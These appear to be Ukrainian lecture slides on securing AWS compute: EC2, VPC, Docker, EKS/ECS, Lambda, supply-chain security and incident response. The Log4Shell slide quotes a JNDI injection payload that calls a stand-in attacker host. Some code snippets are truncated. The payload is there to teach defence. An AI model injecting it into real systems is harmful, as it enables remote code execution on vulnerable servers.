Безпека Amazon EC2

🖥️ Ключові заходи безпеки

  • Вибір перевіреного AMI (Amazon Machine Image)
  • Регулярне оновлення ОС та пакетів
  • Мінімальна поверхня атаки (вимкнути зайві сервіси)
  • SSH-доступ тільки через ключові пари
  • Використання AWS Systems Manager Session Manager замість SSH
  • Instance Metadata Service v2 (IMDSv2)

🔑 IMDSv2 — захист метаданих

  • Вимагає токен для доступу до /latest/meta-data/
  • Захист від SSRF-атак на ролі IAM
  • Обов'язково вмикати на нових інстансах

⚠️ Типові помилки EC2

  • Відкритий порт 22 (SSH) для 0.0.0.0/0
  • Використання IMDSv1 (вразливий до SSRF)
  • Надмірні IAM-права для EC2-ролі
  • Незашифровані EBS-томи
  • Публічний S3-бакет для скриптів user-data
  • Відсутність моніторингу та алертів

EC2: Systems Manager та управління патчами

🔧 AWS Systems Manager (SSM)

  • Session Manager — доступ до EC2 без відкритих портів через AWS console/CLI
  • Patch Manager — автоматичне патчування ОС за розкладом
  • Run Command — виконання команд на флоті інстансів
  • Inventory — інвентаризація пакетів та конфігурацій
  • Parameter Store — безпечне зберігання конфігурацій
SSM Agent передвстановлений на Amazon Linux 2, Amazon Linux 2023, Windows Server. Потрібна IAM-роль AmazonSSMManagedInstanceCore.

🩹 Patch Manager — Patch Baseline

# Перевірка статусу патчів через AWS CLI
aws ssm describe-instance-patch-states \
  --instance-ids i-1234567890abcdef0

# Patch Baseline — правила:
# - Critical: auto-approve after 0 days
# - Important: auto-approve after 7 days
# - CvssScore >= 7.0: включити
Maintenance Window — заплановане вікно для патчування без впливу на продуктивність. Рекомендація: патчі ≤ 30 днів для CRITICAL.

VPC: безпечна мережева архітектура

🏗️ Багаторівнева архітектура VPC

Public Subnet Load Balancer, NAT Gateway, Bastion Host

Private Subnet EC2 застосунки, ECS Tasks, EKS Nodes

Isolated Subnet БД, ElastiCache — без internet-доступу

🔑 Принципи ізоляції

  • EC2 у private subnet — без публічного IP
  • Вихідний трафік — тільки через NAT Gateway
  • VPC Endpoints — доступ до AWS API без інтернету
  • SSM Session Manager замість Bastion Host

🔌 VPC Endpoints (PrivateLink)

ТипВикористання
Gateway EndpointS3, DynamoDB (безкоштовно)
Interface EndpointECR, SSM, Secrets Manager, KMS
# Створити VPC Endpoint для ECR
aws ec2 create-vpc-endpoint \
  --vpc-id vpc-12345 \
  --service-name \
    com.amazonaws.eu-west-1.ecr.api \
  --vpc-endpoint-type Interface \
  --subnet-ids subnet-abc

VPC Endpoints усувають витік трафіку через інтернет і знижують ризик перехоплення даних

Основи контейнеризації

📦 Що таке контейнер?

  • Ізольований процес з власним файловим простором
  • Спільне ядро з хост-системою
  • Швидше за ВМ, легше переносити
  • Образ (Image) = незмінний шаблон
  • Контейнер = запущений екземпляр образу

Docker: архітектура та безпека

🐳 Компоненти Docker

  • dockerd — демон (root-права!)
  • containerd — runtime контейнерів
  • runc — низькорівневий OCI-runtime
  • Docker socket: /var/run/docker.sock

⚠️ Монтування docker.sock

Доступ до сокету = повний контроль над хост-системою. Ніколи не монтуйте його в недовірені контейнери!

🛡️ Запуск без root

# Запуск як non-root user
docker run --user 1000:1000 nginx

# Rootless Docker (демон без root)
dockerd-rootless-setuptool.sh install

# Read-only filesystem
docker run --read-only nginx

Обмеження capabilities

# Видалити всі capabilities, додати лише потрібні
docker run --cap-drop ALL \
           --cap-add NET_BIND_SERVICE nginx

Безпечний Dockerfile

✅ Правильний Dockerfile

# Використовувати конкретний тег образу
FROM python:3.12-slim

# Не запускати від root
RUN addgroup --system app \

WORKDIR /app

# Копіювати тільки потрібні файли
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY --chown=app:app . .

# Перемкнутися на non-root
USER app

# Не відкривати зайвих портів
EXPOSE 8080

CMD ["python", "app.py"]

Multi-stage build — зменшує розмір образу та поверхню атаки: білд-інструменти не потрапляють у production-образ

Multi-stage Build та .dockerignore

🏗️ Multi-stage Build

# Стадія 1: Компіляція (builder)
FROM golang:1.22-alpine AS builder
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 go build \
    -ldflags="-w -s" -o /app ./cmd/server

# Стадія 2: Мінімальний production-образ
FROM gcr.io/distroless/static-debian12
COPY --from=builder /app /app
USER nonroot:nonroot
ENTRYPOINT ["/app"]

distroless: немає shell, package manager — мінімальна поверхня атаки

SBOM — Software Bill of Materials

📋 Що таке SBOM?

  • Повний перелік компонентів ПЗ: OS-пакети, бібліотеки, ліцензії
  • Формати: CycloneDX, SPDX
  • Вимагається NIST EO 14028 (2021) для держ. ПЗ США
  • 80% сучасного ПЗ — сторонні залежності

🔧 Генерація та перевірка SBOM

# Syft — генерація SBOM з образу
syft myapp:latest -o cyclonedx-json \
  > sbom.json

# Grype — перевірка вразливостей по SBOM
grype sbom:sbom.json

# Amazon Inspector → автоматичний SBOM для ECR
# ECR → Inspector → Security Hub

🔏 Image Signing (cosign)

# Підписати образ
cosign sign \
  --key cosign.key \
  123.dkr.ecr.eu-west-1.amazonaws.com\
  /myapp:v1.0

# Перевірити підпис перед деплоєм
cosign verify \
  --key cosign.pub \
  123.dkr.ecr.eu-west-1.amazonaws.com\
  /myapp:v1.0
SLSA Framework (Supply-chain Levels for Software Artifacts) — Google-стандарт для верифікації цілісності збірки ПЗ. Рівні L1–L4.

Kubernetes Secrets: зберігання та шифрування

⚠️ Проблема з K8s Secrets

  • За замовчуванням зберігаються в etcd у base64 (не шифрування!)
  • Будь-хто з читанням etcd — має всі секрети
  • Можуть потрапити в логи при помилках

🔐 Envelope encryption (EKS + KMS)

# Увімкнути envelope encryption в EKS
aws eks associate-encryption-config \
  --cluster-name my-cluster \
  --encryption-config \
  '[{"resources":["secrets"],
    "provider":{
      "keyArn":"arn:aws:kms:..."}}]'

🌐 External Secrets Operator

Синхронізує секрети з AWS Secrets Manager або SSM у K8s Secrets автоматично

apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
spec:
  secretStoreRef:
    name: aws-secrets-manager
    kind: ClusterSecretStore
  target:
    name: db-secret
  data:
  - secretKey: password
    remoteRef:
      key: prod/myapp/db
      property: password

Секрет зберігається в AWS, а не в etcd. Ротація відбувається автоматично.

Pod отримує IAM-роль через Service Account.

Дрібнозернистий доступ до AWS API без постійних ключів.

eksctl create iamserviceaccount \

  --namespace myapp \
  --cluster my-cluster \

EKS: безпека вузлів та Bottlerocket OS

🤖 Bottlerocket OS

  • Спеціалізована ОС AWS для контейнерних навантажень
  • Мінімальний footprint — тільки необхідні компоненти
  • Read-only root filesystem
  • Атомарні оновлення з можливістю rollback
  • dm-verity — верифікація цілісності ОС при завантаженні
  • SELinux увімкнено за замовчуванням

🛡️ Node IAM Role — мінімальні права

  • AmazonEKSWorkerNodePolicy
  • AmazonEC2ContainerRegistryReadOnly
  • AmazonEKS_CNI_Policy
  • IRSA — окремі rights для кожного Pod

Amazon ECS та AWS Fargate

📋 Amazon ECS — компоненти

  • Task Definition — конфігурація контейнерів
  • Service — підтримання N запущених Task
  • Cluster — логічна група ресурсів
  • Task Role — IAM-роль для контейнера

🔒 Безпека Task Definition

{
  "containerDefinitions": [{
    "name": "myapp",
    "image": "123.dkr.ecr.../app:v1",
    "readonlyRootFilesystem": true,
    "user": "1000",
    "linuxParameters": {
      "capabilities": {

⚡ Fargate — переваги безпеки

  • Немає доступу до хост-ОС
  • AWS патчить runtime середовище
  • Кожна Task має власний microVM (Firecracker)
  • Немає спільного ядра між Tasks
  • EphemeralStorage — тимчасова ізольована ФС

🔑 Secrets Management

  • AWS Secrets Manager → inject at runtime
  • AWS SSM Parameter Store (SecureString)
  • Ніколи не передавати секрети через ENV у Dockerfile!

Serverless безпека: AWS Lambda

⚡ Модель виконання Lambda

  • Ізольоване середовище (Firecracker MicroVM)
  • Короткострокове виконання (max 15 хв)
  • Автомасштабування AWS
  • Cold start — нова ізольована VM

🔒 Ключові ризики Lambda

  • Ін'єкції через event-дані (SQL, NoSQL, Command)
  • Надмірні права IAM у execution role
  • Секрети в змінних середовища (env vars)
  • Залежності зі вразливостями в пакетах
  • Event injection через API Gateway, SQS

Lambda: мережева ізоляція та VPC

🌐 Lambda без VPC (за замовчуванням)

  • Виконується в управлінській мережі AWS
  • Є доступ до інтернету та публічних AWS API
  • Немає доступу до приватних ресурсів VPC (RDS, Redis)
  • Підходить для: публічних API, обробки S3-подій

🔒 Lambda у VPC

  • Доступ до приватних ресурсів (RDS, ElastiCache)
  • Контроль вхідного/вихідного трафіку через Security Groups
  • Вихідний інтернет-трафік через NAT Gateway
  • VPC Endpoints для AWS API без NAT

  • AppArmor — профілі доступу до ФС
  • SELinux — мандатний контроль доступу
  • gVisor — додаткове ядро-пісочниця для контейнерів
  • Kata Containers — VM-ізоляція для контейнерів

Supply Chain Attacks: Log4Shell та уроки

💀 Log4Shell (CVE-2021-44228)

Що трапилось: вразливість RCE у Log4j 2.x — найпоширеніший Java-логгер

Вектор: ${jndi:ldap://attacker.com/a} в будь-якому логованому рядку

Масштаб: >100 млн потенційно вразливих пристроїв, тисячі продуктів

Відкрито: 9 грудня 2021, активне використання за 24 год після публікації

📦 Чому контейнери особливо вразливі

  • Контейнери "заморожують" версії залежностей
  • Образ місячної давнини = всі його CVE досі в prod
  • SBOM допомагає знайти Log4j у всіх образах миттєво

🛡️ Захист від Supply Chain атак

  • SBOM — знати всі транзитивні залежності
  • ECR Enhanced Scanning — безперервне сканування, не тільки при push
  • Image Signing — cosign/Notary, верифікація цілісності
  • Оновлення базових образів — мінімум щотижня
  • Admission Control — заборонити образи без підпису або з CRITICAL CVE
SolarWinds (2020) — компроміс збірки: шкідливий код потрапив у підписане оновлення. Захист: SLSA L3+ з верифікацією build provenance

Реагування на інциденти у контейнерних середовищах

🚨 IR для контейнерів — відмінності

  • Ефемерність — контейнер може зникнути до початку розслідування
  • Immutable Infrastructure — не патчувати, а перерозгорнути
  • Централізовані логи — CloudWatch, S3 (не в контейнері!)
  • Forensic snapshot — зробити до завершення Pod

🔍 Кроки при компрометації контейнера

  1. Ізолювати — відкликати мережевий доступ (NetworkPolicy / SG)
  2. Зберегти артефакти (логи, стан ФС, memory dump)
  3. Зупинити контейнер (не видаляти до розслідування)
  4. Аналізувати образ та event logs
  5. Оновити образ та перерозгорнути

Zero Trust у хмарних обчислювальних середовищах

🔒 Принципи Zero Trust

"Never trust, always verify"

  • Перевіряй кожен запит незалежно від мережі джерела
  • Мінімальні привілеї на рівні кожної транзакції
  • Мікросегментація мережі
  • Безперервна аутентифікація та авторизація
  • Логування та аналіз усіх дій

☁️ Zero Trust в AWS

  • IAM: перевірка кожного API-виклику
  • VPC: мережева мікросегментація + NetworkPolicy
  • AWS Verified Access: ZT-доступ до внутрішніх застосунків

🌐 Service Mesh: Istio / AWS App Mesh

  • mTLS між усіма мікросервісами автоматично
  • Автоматична ротація сертифікатів (cert-manager)
  • Авторизаційні політики на рівні сервісу
  • Telemetry та трасування трафіку (Jaeger, Kiali)

Кращі практики безпеки обчислювальних сервісів

🖥️ EC2

  • Systems Manager замість SSH (без відкритого 22)
  • IMDSv2 обов'язково
  • Patch Management через AWS SSM
  • Amazon Inspector для CVE-моніторингу
  • Мінімальні IAM Instance Profile права

🐳 Контейнери (ECS/EKS)

  • Multi-stage Dockerfile, мінімальний базовий образ
  • Non-root, read-only FS, drop capabilities
  • Приватний ECR + автосканування
  • IRSA замість статичних ключів
  • Network Policy: default deny

⚡ Lambda / Serverless

  • Execution Role з мінімальними правами
  • Валідація всіх вхідних даних
  • Secrets Manager, не ENV vars
  • VPC + Security Group для ізоляції
  • X-Ray для трасування та аудиту

🔍 Загальне

  • Шифрування даних (KMS) у стані спокою і в русі
  • GuardDuty + Security Hub + CloudTrail
  • Автоматизовані Compliance-перевірки (AWS Config)
  • Резервне копіювання та disaster recovery

Підсумок лекції

Ключові концепції

  • Модель спільної відповідальності залежить від рівня сервісу (EC2 → Lambda)
  • Контейнери ≠ повна ізоляція — shared kernel = спільний ризик
  • Non-root, read-only FS, drop capabilities — базові заходи
  • IMDSv2 захищає IAM-credentials від SSRF
  • IRSA/Task Role — без статичних ключів у контейнерах
  • Secrets Manager / SSM — жодних секретів у коді
  • Сканування образів — обов'язкова частина CI/CD
  • Network Policy: default deny → явний allow
